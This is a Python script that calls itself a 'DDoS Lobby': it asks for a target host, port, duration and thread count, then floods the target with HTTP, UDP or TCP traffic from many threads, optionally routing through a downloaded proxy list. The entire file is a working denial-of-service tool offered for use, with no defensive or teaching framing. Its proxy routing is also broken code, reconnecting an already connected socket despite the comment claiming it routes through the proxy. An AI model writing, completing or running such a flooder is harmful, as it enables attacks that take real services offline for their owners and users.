import socket
import threading
import random
import time
import requests

# Load proxy list from a file or online source
def load_proxies():
    try:
        response = requests.get("https://www.proxy-list.download/api/v1/get?type=http")
        proxies = response.text.split("\r\n")  # Adjust if the format is different
    except:
        print("❌ Failed to fetch proxies. Using local file instead.")
        with open("proxies.txt", "r") as file:
            proxies = [line.strip() for line in file.readlines()]
    
    return proxies if proxies else None

# Lobby for setting parameters
def lobby():
    print("🔥 Welcome to the DDoS Lobby 🔥")
    target = input("Enter Target IP/Domain: ")
    port = int(input("Enter Target Port: "))
    attack_type = input("Select Attack Type (HTTP/UDP/TCP): ").upper()
    duration = int(input("Enter Attack Duration (seconds): "))
    thread_count = int(input("Enter Number of Threads: "))
    
    use_proxies = False
    proxy_list = None
    if attack_type == "HTTP":
        use_proxies = input("Use Proxies? (yes/no): ").lower() == "yes"
        if use_proxies:
            proxy_list = load_proxies()
            if not proxy_list:
                print("❌ No proxies available. Running without proxies.")
                use_proxies = False
    
    return target, port, attack_type, duration, thread_count, use_proxies, proxy_list

# HTTP Flood with proxy support
def http_flood(target, duration, use_proxies, proxy_list):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            proxy = random.choice(proxy_list) if use_proxies and proxy_list else None
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 80))
            
            request = f"GET /{random.randint(1, 999999)} HTTP/1.1\r\nHost: {target}\r\n\r\n"
            
            if proxy:
                proxy_host, proxy_port = proxy.split(":")
                s.connect((proxy_host, int(proxy_port)))  # Route through proxy
            
            s.send(request.encode())
            s.close()
        except:
            pass

# UDP Flood
def udp_flood(target, port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target, port))
        except:
            pass

# TCP Flood
def tcp_flood(target, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(random._urandom(1024))
            s.close()
        except:
            pass

# Main function
def start_attack(target, port, attack_type, duration, thread_count, use_proxies, proxy_list):
    attack_function = {
        "HTTP": lambda: http_flood(target, duration, use_proxies, proxy_list),
        "UDP": lambda: udp_flood(target, port, duration),
        "TCP": lambda: tcp_flood(target, port, duration)
    }.get(attack_type, None)

    if attack_function is None:
        print("❌ Invalid Attack Type. Exiting.")
        return

    print(f"🔥 Starting {attack_type} attack on {target}:{port} for {duration}s with {thread_count} threads... 🔥")

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack_function)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("✅ Attack Completed.")

# Run the program
if __name__ == "__main__":
    settings = lobby()
    start_attack(*settings)
